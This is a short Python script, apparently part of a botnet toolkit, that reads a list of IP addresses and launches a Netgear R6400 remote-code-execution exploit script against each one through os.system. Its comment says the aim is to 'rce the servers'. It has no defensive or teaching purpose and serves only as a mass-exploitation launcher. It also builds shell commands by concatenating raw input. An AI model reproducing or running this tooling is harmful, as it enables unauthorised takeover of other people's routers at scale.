import sys, threading, os

def loligang(input_file):
	input_file = open(sys.argv[1])
	for i in input_file.readlines():
		ip = i.strip("\n")
		try:
			print("______________________________________________________")
			print("[+]SCANNING: " + ip + " [+]")
			hydrocodone = ("python RCE/netgearr6400.py "+ip) #rce the servers maybe 
			os.system(hydrocodone)
		except:
			pass
	input_file.close()
if __name__ == "__main__":
	x = threading.Thread(target=loligang, args=(1,))
	x.start()
